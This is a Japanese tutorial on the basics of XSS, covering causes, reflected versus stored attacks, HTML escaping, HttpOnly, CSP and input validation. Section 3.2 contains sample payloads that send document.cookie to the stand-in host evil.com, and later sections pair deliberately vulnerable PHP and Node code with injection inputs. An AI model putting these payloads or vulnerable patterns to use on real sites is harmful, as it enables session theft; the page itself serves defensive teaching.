    20 インジェクション

    XSSの基本

    XSS（クロスサイトスクリプティング）は、Web ページに悪意ある JavaScript を紛れ込ませ、そのページを見た人のブラウザで実行させる攻撃です。このページでは、XSS が起きる理由（データが命令として読まれること）、Cookie の盗み出しやワームといった被害、反射型と持続型の違い、そして根本対策である HTML エスケープと、被害を減らす保険的対策までを、徳丸本（『体系的に学ぶ 安全なWebアプリケーションの作り方』）第5章に沿って解説します。

    もとにしたノート：20_インジェクション/01_XSS基本編（徳丸本5章）・04_SQLインジェクションとXSS（ねる前エンジニアリング）

    ひとことで言うと

    XSS は 「ただの文字（データ）のつもりで画面に出した入力が、ブラウザに命令（HTML タグやスクリプト）として読まれてしまう」 穴です。対策の基本は、HTML にはめ込む直前に 文字として表示される形に置き換える（HTML エスケープ） ことです。被害を受けるのは、書き込んだ人ではなく そのページを見た人 です。

    第4章では入力値の検証について学びました。第5章では 出力（表示）処理 に焦点を当て、クロスサイトスクリプティング（XSS） の仕組みと対策を解説します。

    1.クロスサイトスクリプティング（XSS）とは

    クロスサイトスクリプティング（Cross-Site Scripting / XSS） は、Web ページに 悪意ある JavaScript を注入 し、閲覧者のブラウザ上で実行させる攻撃です。「注入（インジェクション）」とは、本来データが入るはずの場所に、命令として働く文字を紛れ込ませることです。

    項目内容
    別名クロスサイト・スクリプティング
    分類インジェクション系脆弱性（徳丸本第4章）
    攻撃対象他ユーザーのブラウザ
    インターフェースHTML

    インジェクション全体の考え方は、71 セキュリティ基礎の インジェクションと暗号化の不備 でまとめています。

    1.1 日常生活での例え

    正常なWebページ

    掲示板に「こんにちは」と表示される。

    XSS

    掲示板に「こんにちは <script> 悪意あるコード </script>」と書かれ、他の人が読むたびにスクリプトが動く。

    1.2 攻撃者の目的

    目的説明
    セッション窃取Cookie からセッションID（ログイン状態を表す合言葉のような値）を盗み、なりすましログイン
    フィッシング偽のログインフォームを表示してパスワードを盗む
    キーロギング入力されたキー操作を外部に送信
    ページ改ざん表示内容を書き換える
    ワーム拡散悪意あるスクリプトを自動的に他ページへ投稿

    1.3 なぜ起きるか

    ユーザー入力 → サーバー → HTMLにそのまま埋め込み → ブラウザが <script> を実行

    根本原因：出力時に HTMLエスケープ を行わず、ユーザー入力をそのまま HTML に含めている。

    2.データと命令：XSS の根っこ

    XSS と SQLインジェクションは、根っこが同じ穴です。どちらも データのつもりで入れた文字が、命令として解釈されてしまう ことが原因で、対策も共通して データと命令の境界で分ける ことです。「記号を消す」より「そもそも混ぜない」が基本になります（SQL 側の話は SQLインジェクション で扱います）。

    2.1 データと命令の違い

    データ

    読まれるだけのもの（名前やコメント）。中に何が書いてあっても、本来は何も起きない。

    命令

    読み手がその通りに動くもの（「この人を探せ」「これを表示しろ」）。

    どちらも 同じ文字でできている ため、境目が曖昧になると取り違えが起きます。

    2.2 画面でデータが命令に化けるまで

    • 画面（HTML）も、段落の札（<p> のようなタグ）などのひな型にコメントをはめ込んで作っている
    • コメント欄に <script> の札で囲んだプログラムを書き込むと、ブラウザは尖った括弧（< >）を札（命令）として読み、中身がプログラムとして動く
    • 動く場所は、そのコメントを 開いた別の人のブラウザ。見た人がログインしていれば、その人の権限で動いてしまうことがある。書いた人ではなく見た人が被害を受ける

    実務では、たとえば「口コミのコメント欄に書かれたコメントを別の人が開いたら、中身がプログラムとして動き出した」という形で表に出ます。

    2.3 対策：文字として表示する形に変える

    • HTML にはめ込む直前に、入力を文字として表示する形に置き換える（< → &lt;）。これを エスケープ と呼ぶ。「スクリプト」という文字が画面に見えるだけで動かない
    • 自分で探して書き換えるのではなく、React のような最近の部品（フレームワーク）は波括弧（{ }）で表示すると 自動でエスケープ してくれる
    • 危ないのは、自動の仕組みを外す書き方
      • innerHTML：中身を HTML として入れるので、札があれば命令として読まれる
      • React の dangerouslySetInnerHTML：名前で「危険」と警告している
    • 安全な書き方：textContent は文字として入れる。React では波括弧で出せば十分

    innerHTML と textContent、React の書き方を並べたコード例は、71 セキュリティ基礎「XSS：脆弱なコードと安全なコード」 にあります。

    3.XSS によるクッキー値の盗み出し

    XSS で最も恐れられる被害のひとつが、Cookie（セッションID）の盗み出し です。Cookie は、サイトがブラウザに保存させる小さなデータで、ログイン状態の目印として使われます。

    3.1 攻撃の流れ

    1. 攻撃者が XSS のペイロード（攻撃コード）をページに仕込む
    2. 被害者がそのページを開く
    3. ブラウザ上で JavaScript が実行される
    4. document.cookie で Cookie を読み取り、攻撃者のサーバーへ送信
    5. 攻撃者が盗んだセッションIDで被害者になりすます

    3.2 攻撃コードの例

    ✕ 攻撃コード：別サイトへ移動させ、URL に Cookie を付ける 
    <script>
  document.location =
    'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
    ✕ 攻撃コード：より目立たない方法（画像タグを利用） 
    // より目立たない方法（画像タグを利用）
new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;

    2つ目は画像を読み込むふりをして、裏で攻撃者のサーバーにリクエストを送らせます。画面が移動しないので、被害者は気づきにくくなります。

    3.3 なぜ Cookie が読めるか

    • 同一オリジン（スキーム・ホスト・ポートが同じ範囲）のページで実行された JavaScript は document.cookie にアクセスできる
    • XSS により そのサイトのページ上 でスクリプトが動くため、Cookie も読める

    同一オリジンポリシーは「別サイトのスクリプトにはデータを読ませない」ルールですが、XSS は攻撃者のスクリプトを 正規サイトの内側 で動かすため、このしきりを素通りしてしまいます（→ 同一オリジンポリシー）。

    3.4 対策の方向性

    対策効果
    HTMLエスケープXSS 自体を防ぐ（根本対策）
    HttpOnly 属性JavaScript から Cookie を読めなくする（保険）

    4.XSS を悪用したワーム

    XSS ワーム とは、XSS を利用して 悪意あるスクリプトを自動的に拡散 させる攻撃です。ワームとは、自分自身を複製して広がっていくプログラムのことです。ソーシャルネットワークの掲示板やコメント欄で特に問題になります。

    4.1 攻撃の流れ

    1. 攻撃者が掲示板に XSS ペイロードを投稿
    2. ユーザーAがページを閲覧 → スクリプト実行
    3. スクリプトがユーザーAの権限で「同じペイロード」を自動投稿
    4. ユーザーB, C, D... が閲覧 → さらに拡散
    5. 指数関数的に感染が広がる

    4.2 ワームのペイロード例（概念）

    ✕ 攻撃コード（概念）：閲覧者の権限でコメントを自動投稿 
    <script>
  // ログイン済みユーザーの権限でコメントを自動投稿
  fetch('/api/comments', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      text: '<script>/* 同じ攻撃コード */</script>'
    })
  });
</script>

    fetch はブラウザから HTTP リクエストを送る関数です。同じサイトへのリクエストなので、閲覧者の Cookie が自動で付き、閲覧者本人が投稿したのと同じ扱い になります。

    補足：この例はあくまで概念です

    実際の HTML では、<script> の中の文字列に </script> と書くと、ブラウザはそこで外側の script 要素が終わったと解釈します。この例はそのままでは動かず、「同じコードを複製して投稿する」という考え方を示すためのものです。

    4.3 反射型 vs 持続型（ワーム化しやすさ）

    種類ワーム化しやすさ
    持続型（Stored）非常に高い（DBに保存され、全訪問者が実行）
    反射型（Reflected）低い（被害者が特定URLを開いたときのみ）

    持続型 XSS は掲示板・SNS・Wiki など ユーザー入力が保存される場所 で特に危険です。2つの違いは次の章で詳しく見ます。

    5.反射型 XSS と持続型 XSS

    XSS は、悪意あるスクリプトが どこに・どう残るか によって2種類に分けられます。

    5.1 反射型XSS（Reflected XSS / 非持続型）

    リクエストに含まれた入力が、その場でレスポンスに反映 されるタイプです。サーバーに保存されません。「反射」は、送った入力が鏡のようにそのまま跳ね返ってくることを表しています。

    攻撃者が悪意あるURLを作成
  ↓
https://example.com/search?q=<script>alert(1)</script>
  ↓
被害者がURLをクリック
  ↓
サーバーが q の値を検索結果ページに表示
  ↓
<script> が実行される
    特徴内容
    保存サーバーに保存されない
    拡散URLを踏ませる必要がある（フィッシング等）
    発生箇所検索結果、エラーメッセージ、リダイレクト

    5.2 持続型XSS（Stored XSS / 蓄積型）

    悪意あるスクリプトがサーバー（DB等）に保存 され、ページを表示するたびに実行されます。

    攻撃者がコメント欄に <script>...</script> を投稿
  ↓
DBに保存される
  ↓
他のユーザーがページを閲覧
  ↓
全員のブラウザでスクリプトが実行される
    特徴内容
    保存DB・ファイル等に永続化
    拡散ページを見た全員が被害
    発生箇所掲示板、コメント、プロフィール、Wiki

    5.3 比較表

    反射型XSS持続型XSS
    別名非持続型蓄積型
    保存なしあり
    被害者URLを開いた人ページを閲覧した全員
    危険度中高
    ワーム化しにくいしやすい

    このほか、サーバーを経由せずブラウザ側の JavaScript の処理だけで起きる DOM ベース XSS もあります（71 セキュリティ基礎 の表を参照）。

    6.HTML エスケープの概念

    HTMLエスケープ は、XSS を防ぐ 最も基本的で重要な対策 です。特殊文字を HTML として解釈されない形式（文字参照：&lt; のように & で始まり ; で終わる、文字を表す書き方）に変換します。

    6.1 仕組み

    ユーザー入力:  <script>alert(1)</script>
       ↓ HTMLエスケープ
出力:          &lt;script&gt;alert(1)&lt;/script&gt;
       ↓ ブラウザの表示
画面表示:      <script>alert(1)</script>  （テキストとして表示、実行されない）

    6.2 エスケープ対象の文字

    文字エスケープ後理由
    <&lt;タグの開始を防ぐ
    >&gt;タグの終了を防ぐ
    "&quot;属性値の脱出を防ぐ
    '&#x27; または &apos;属性値の脱出を防ぐ
    &&amp;実体参照の開始を防ぐ

    6.3 エスケープのタイミング

    ✕ 入力時にエスケープ 
    DBにエスケープ済みデータが保存され、二重エスケープの原因に
    ○ 出力時にエスケープ 
    表示直前に変換（推奨）

    二重エスケープとは、すでに変換した &lt; をもう一度変換して &amp;lt; にしてしまい、画面に「&lt;」という記号がそのまま出てしまう状態です。

    原則：出力する場所（コンテキスト）に応じて エスケープする。コンテキストとは、「HTML の本文」「属性の値」「JavaScript の中」のような、文字が置かれる場所の種類のことです。

    出力先エスケープ方法
    HTML本文HTMLエスケープ
    HTML属性HTML属性エスケープ
    JavaScriptJavaScriptエスケープ
    URLURLエンコード

    7.要素内容の XSS と出力コンテキスト

    HTML には 要素内容（Element Content） と 属性値（Attribute Value） など、出力コンテキストが異なります。コンテキストを間違えると、エスケープしても XSS を防げない場合があります。

    7.1 要素内容への XSS

    HTML タグの 中身（<p> と </p> の間など）にユーザー入力を出力するケースです。

    ✕ 脆弱：ユーザー入力 name をそのまま出力 
    <p>こんにちは、<?= $name ?>さん！</p>

<!-- 攻撃入力: <script>alert(1)</script> -->
<p>こんにちは、<script>alert(1)</script>さん！</p>
    ○ 安全：HTMLエスケープして出力 
    <p>こんにちは、&lt;script&gt;alert(1)&lt;/script&gt;さん！</p>

    <?= $name ?> は PHP で変数の値をそのまま出力する短い書き方です。

    7.2 属性値への XSS

    HTML 属性の 値 にユーザー入力を出力するケースです。属性値は 引用符で囲む 必要があります。

    ✕ 脆弱：属性値にエスケープなし 
    <input type="text" value="<?= $keyword ?>">

<!-- 攻撃入力: " onmouseover="alert(1) -->
<input type="text" value="" onmouseover="alert(1)">
    ○ 安全：エスケープ ＋ ダブルクォートで囲む 
    <input type="text" value="&quot; onmouseover=&quot;alert(1)">

    攻撃入力の先頭の " で value 属性が閉じられ、onmouseover（マウスが乗ったときに動く処理を指定する属性＝イベントハンドラ）が新しい属性として追加されてしまいます。" を &quot; にすれば、属性の外に出られません。

    7.3 JavaScript コンテキストへの XSS

    ✕ 危険：JS文字列に直接埋め込み 
    <script>var name = '<?= $name ?>';</script>

<!-- 攻撃入力: '; alert(1); // -->
<script>var name = ''; alert(1); //';</script>

    対策：HTMLエスケープだけでは不十分。JavaScript 用のエスケープ、または JSON 形式で安全に渡す。

    7.4 コンテキスト別の対策まとめ

    コンテキスト対策
    HTML要素内容HTMLエスケープ
    HTML属性値HTML属性エスケープ ＋ 引用符で囲む
    JavaScriptJSエスケープ / JSON.stringify
    CSSCSSエスケープ
    URLURLエンコード ＋ 許可スキームの検証

    属性値・URL（href / src）・script 要素の中など、コンテキストごとの詳しい書き方は次のページ XSS発展編：属性・JavaScript内のXSS で扱います。

    8.XSS 対策の基本：出力時のエスケープ

    XSS 対策の基本は、第4章の 入力‐処理‐出力モデル（アプリの処理を「入力を受け取る → 処理する → 結果を出力する」の3段階に分けて考えるモデル）の「出力」段階で実施します。

    防御の優先順位：

1. 出力時のエスケープ（根本対策）  ← 最優先
2. 入力値検証（補助）
3. HttpOnly、CSP 等（保険的対策）

    8.1 脆弱なコード vs 安全なコード

    ✕ 脆弱（PHP） 
    $name = $_GET['name'];
echo "<p>こんにちは、{$name}さん！</p>";
    ○ 安全（PHP） 
    $name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<p>こんにちは、{$name}さん！</p>";
    ✕ 脆弱（JavaScript / Node.js） 
    const name = req.query.name;
res.send(`<p>こんにちは、${name}さん！</p>`);
    ○ 安全（テンプレートエンジンの自動エスケープを利用） 
    // EJS, Pug, React 等はデフォルトでエスケープ
res.render('greeting', { name: req.query.name });

    Node.js の例のように、バッククォートで囲んだテンプレート文字列の中に ${name} で埋め込む書き方も、文字列の足し算と同じく データと命令の境界を消してしまいます。動いてしまうので気づきにくい点に注意しましょう。

    8.2 テンプレートエンジンを使う

    テンプレートエンジン とは、HTML のひな型に値をはめ込んで画面を作る仕組みです。多くは、はめ込む値を自動でエスケープします。

    テンプレート自動エスケープ
    React / VueJSX / テンプレートがデフォルトでエスケープ
    EJS<%= %> はエスケープあり
    Twig (PHP)デフォルトでエスケープ
    Blade (PHP){{ }} はエスケープあり

    注意

    innerHTML や {!! !!}（Blade のエスケープなし出力）を使うと脆弱になる。

    9.htmlspecialchars 関数

    htmlspecialchars は、PHP で HTML エスケープを行う標準関数です。

    9.1 基本構文

    htmlspecialchars(string $string, int $flags, ?string $encoding): string

    9.2 使用例

    $input = '<script>alert("XSS")</script>';

// 基本的な使い方
echo htmlspecialchars($input);
// 出力: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// 推奨：ENT_QUOTES でシングルクォートもエスケープ
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

    9.3 フラグ（第2引数）

    フラグ効果
    ENT_QUOTESシングルクォート ' もエスケープ（推奨）
    ENT_COMPATダブルクォート " のみエスケープ（デフォルト）
    ENT_HTML5HTML5 向けのエスケープ

    補足：PHP 8.1 以降はデフォルトが変わっています

    「ENT_COMPAT がデフォルト」は PHP 8.0 までの話です。PHP 8.1 以降のデフォルトは ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401 で、シングルクォートもエスケープされます。それでも、古い環境との違いで事故が起きないよう、ENT_QUOTES と 'UTF-8' を毎回明示する書き方が安全です。

    9.4 エンコーディング（第3引数）

    // UTF-8 を明示（推奨）
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

    必ず UTF-8 を指定 し、文字化けやエンコーディング不一致による XSS を防ぐ。

    9.5 関連関数

    関数用途
    htmlspecialcharsHTML 出力用エスケープ
    htmlentitiesより多くの文字を実体参照に変換
    htmlspecialchars_decodeエスケープを元に戻す（表示時は通常不要）

    10.レスポンスの文字エンコーディング指定

    XSS 対策として、レスポンスの 文字エンコーディング（文字をバイト列で表すときの規則。UTF-8 や Shift_JIS など）を明示することが重要です。ブラウザが文字コードを誤解すると、フィルタをすり抜ける攻撃（エンコーディング攻撃）の原因になります。

    10.1 Content-Type ヘッダ

    Content-Type: text/html; charset=UTF-8
                              ↑
                    文字エンコーディングを明示

    10.2 HTML の meta タグ（補助的）

    <meta charset="UTF-8">

    注意：HTTP ヘッダの Content-Type が優先されます。meta タグだけに頼らない。

    10.3 なぜ重要か

    問題説明
    文字コードの不一致UTF-8 想定のデータを Shift_JIS として解釈
    エンコーディング攻撃特殊なバイト列で <script> を別の形で表現
    フィルタ回避エンコーディングの違いでサニタイズ（危険な文字の除去・無害化）をすり抜ける

    10.4 設定例

    ○ PHP 
    // PHP
header('Content-Type: text/html; charset=UTF-8');
    ○ Express.js 
    // Express.js
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'text/html; charset=UTF-8');
  next();
});

    10.5 ベストプラクティス

    • アプリ全体で UTF-8 に統一
    • 入力・DB・出力すべて同じエンコーディングを使用
    • レスポンスヘッダで charset=UTF-8 を必ず指定

    11.XSS に対する保険的対策

    HTMLエスケープが 根本対策 である一方、万が一 XSS が起きた場合の被害を 軽減する保険 も存在します。これらだけでは XSS を防げません。複数の守りを重ねる考え方は 深層防御 を参照してください。

    根本対策:  HTMLエスケープ、CSP
保険的対策: HttpOnly、X-XSS-Protection 等

    補足：CSP は「保険的対策」側です

    ノートのこの図では CSP が根本対策に入っていますが、同じノートのまとめや優先順位では CSP は保険的対策として扱われています。CSP は XSS が起きたときに スクリプトの実行を止めて被害を抑える 仕組みで、XSS の原因（エスケープ漏れ）そのものはなくしません。根本対策はあくまで出力時のエスケープで、CSP は保険として重ねる層と考えるのが一般的です（→ CSP）。

    12.X-XSS-Protection レスポンスヘッダ

    X-XSS-Protection は、ブラウザ内蔵の XSS フィルタを有効にする HTTP レスポンスヘッダでした。

    X-XSS-Protection: 1; mode=block
    値意味
    0フィルタを無効化
    1フィルタを有効化
    1; mode=block検出時にページ表示をブロック

    12.1 現状

    ポイント説明
    非推奨Chrome 等の主要ブラウザでは削除または無効化済み
    限界ブラウザ依存で、すべての XSS を防げない
    位置づけ保険的対策。エスケープの代わりにはならない

    補足：今は「1; mode=block」を付けません

    ブラウザの XSS フィルタは、それ自体が情報漏えいなどの新しい脆弱性の原因になったため廃止されました。現在の推奨は ヘッダを付けないか、付けるなら X-XSS-Protection: 0（無効化） です。上の 1; mode=block は過去の設定例として読んでください（→ セキュリティヘッダ「付けない・消すべきヘッダ」）。

    12.2 現代の推奨

    X-XSS-Protection の代わりに Content-Security-Policy（CSP） の導入が推奨されます。

    Content-Security-Policy: default-src 'self'; script-src 'self'

    CSP は「このページでは信頼できるソースのスクリプトだけ実行する」と宣言する仕組みで、XSS の影響を大幅に軽減できます。ディレクティブ（script-src などの指定項目）や nonce の使い方は CSP（コンテンツセキュリティポリシー） で詳しく扱っています。

    13.入力値検証

    第4章で学んだ 入力値検証（受け取った値が、決めた形式・長さ・文字種に合っているかを確かめること）は、XSS 対策の 補助 として有効です。ただし、入力値検証だけでは XSS を完全に防げません。

    13.1 入力値検証でできること

    チェック例
    制御文字の除去改行・NULL の排除
    文字数制限コメント 500文字以内
    許可文字の制限ユーザー名は英数字のみ
    タグの禁止<, > を含む入力を拒否
    ○ ホワイトリスト（許可する文字だけを決める方式） 
    // ホワイトリスト：英数字と日本語のみ許可
function validateComment(text) {
  if (!/^[\w\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF\s]+$/.test(text)) {
    return '使用できない文字が含まれています';
  }
  if (text.length > 500) {
    return '500文字以内で入力してください';
  }
  return null;
}

    正規表現の \u3040-\u309F はひらがな、\u30A0-\u30FF はカタカナ、\u4E00-\u9FFF は漢字の範囲です。この例では「。」「、」や「！」も許可されていないため、普通の日本語コメントも弾かれます。これは下の「正当な入力を拒否」という限界の具体例にもなっています。

    13.2 入力値検証の限界

    限界理由
    ブラックリストは不完全<script> 以外にも <img onerror=...> 等、多数の手法がある
    正当な入力を拒否「< を含む」等のルールは <3 など正常な入力も弾く
    エンコーディングの回避フィルタをエンコーディングの差ですり抜けられる

    ブラックリストとは、禁止する文字やパターンを列挙する方式です。危ない記号をすべて自分で見つける前提なので、1か所でも漏れればそこから入られます。

    結論

    入力値検証は 第1の防御線 として有用だが、出力時の HTMLエスケープが必須。チェックは入口、境界で分ける（エスケープする）のは最後の砦という 二重の守り が基本です。

    14.クッキーに HttpOnly 属性を付与

    HttpOnly 属性は、JavaScript から Cookie にアクセスできなくする属性です。XSS による Cookie 盗み出し を防ぐ保険的対策として重要です。Cookie 属性そのものの詳しい説明は、74 セッション管理（10 クッキー）で扱います。

    14.1 設定方法

    Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
                              ↑
                    JavaScript から読めなくなる
    ○ Express.js 
    // Express.js
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

    14.2 効果

    ✕ HttpOnly なし 
    // HttpOnly なし
document.cookie;  // "sessionId=abc123"  ← XSS で盗める
    ○ HttpOnly あり 
    // HttpOnly あり
document.cookie;  // ""  ← sessionId は含まれない
    属性XSS 対策での役割
    HttpOnlyJS から Cookie を読めなくする
    SecureHTTPS のみ送信（盗聴防止）
    SameSiteクロスサイト送信を制限（CSRF 対策にも有効）

    CSRF（クロスサイトリクエストフォージェリ）は、CSRF のページで扱います。

    14.3 注意点

    注意説明
    XSS 自体は防がないページ改ざん・キーロギング等は依然として可能
    セッションID以外localStorage（ブラウザにデータを保存する仕組み。JS から自由に読める）に保存したトークンは HttpOnly では守れない
    根本対策ではないHTMLエスケープと併用する

    たとえば HttpOnly で Cookie を読めなくしても、ワーム のように閲覧者の権限でリクエストを送ることはできてしまいます。

    15.まとめ

    トピック要点
    XSS悪意ある JavaScript を被害者のブラウザで実行させる攻撃
    データと命令データのつもりの文字が命令として読まれるのが原因。消すより混ぜない
    Cookie 盗み出しdocument.cookie 経由。HttpOnly で軽減
    XSS ワーム持続型 XSS で自動拡散
    反射型 XSSリクエストに含まれ、その場で反映（非持続型）
    持続型 XSSDB に保存され、閲覧者全員が実行（危険度が高い）
    HTMLエスケープ出力時に <, >, " 等を変換（根本対策）
    要素内容の XSSコンテキスト（要素・属性・JS）に応じたエスケープが必要
    htmlspecialcharsPHP の HTML エスケープ関数（ENT_QUOTES, UTF-8 推奨）
    文字エンコーディングContent-Type: charset=UTF-8 を明示
    保険的対策HttpOnly、CSP 等（エスケープの代わりにはならない）
    X-XSS-Protection旧来のブラウザフィルタ（現在は非推奨、CSP を推奨。付けるなら 0）
    入力値検証補助的対策。出力エスケープと併用
    HttpOnlyJS から Cookie を読めなくする

    15.1 XSS 対策の優先順位

    1. 出力時の HTMLエスケープ（必須）
    2. テンプレートエンジンの自動エスケープを利用
    3. Content-Security-Policy（CSP）の設定
    4. 入力値検証（補助）
    5. Cookie に HttpOnly ＋ Secure ＋ SameSite を設定（保険）

    16.理解度チェック

    Q1. XSS で被害を受けるのは誰ですか？ SQLインジェクションとの共通点は何ですか？

    被害を受けるのは、攻撃コードを書いた人ではなく そのページを見た人（のブラウザ） です。SQLインジェクションとは読み手（DB かブラウザか）が違うだけで、どちらも データのつもりの文字が命令として読まれる という同じ形の穴です。

    Q2. 反射型 XSS と持続型 XSS では、どちらが危険度が高いですか？ その理由は？

    持続型 です。攻撃コードが DB などに保存されるため、URL を踏ませなくても ページを見た全員 のブラウザで実行され、ワームとして自動拡散もしやすいからです。反射型は、罠の URL を開いた人だけが被害を受けます。

    Q3. HTML エスケープは、入力時と出力時のどちらで行うべきですか？

    出力時（表示直前） です。入力時にエスケープすると DB にエスケープ済みのデータが入り、二重エスケープの原因になります。また、出力先（HTML本文・属性・JavaScript・URL）によって必要な変換が違うため、出力する場所に合わせて行います。

    Q4. <input value="<?= $keyword ?>"> に " onmouseover="alert(1) を入れられると何が起きますか？ どう防ぎますか？

    先頭の " で value 属性が閉じ、onmouseover="alert(1)" が新しい属性として追加され、マウスを乗せるとスクリプトが動きます。属性値を必ずダブルクォートで囲み、htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8') のように " もエスケープして出力します。

    Q5. Cookie に HttpOnly を付ければ、XSS 対策は十分ですか？

    十分ではありません。 HttpOnly は document.cookie から Cookie を読めなくするだけで、XSS 自体は防ぎません。ページ改ざん・キーロギング・閲覧者の権限での自動投稿などは依然として可能で、localStorage のトークンも守れません。出力時のエスケープと併用する保険です。

    Q6. 今から新しくサイトを作るとき、X-XSS-Protection: 1; mode=block を設定すべきですか？

    いいえ。 ブラウザの XSS フィルタは廃止されており、フィルタ自体が脆弱性の原因になったこともあります。付けるなら 0（無効化）にし、被害を抑える保険には CSP を使います。もちろん根本対策は出力時のエスケープです。

    Q7. 「入力チェックで <script> を禁止したから XSS は大丈夫」と言われました。何が問題ですか？

    ブラックリストは不完全で、<img onerror=...> など <script> を使わない手口がたくさんあります。エンコーディングの差ですり抜けられることもあります。入力値検証は補助として役立ちますが、出力時のエスケープ（境界で分けること）が必須です。
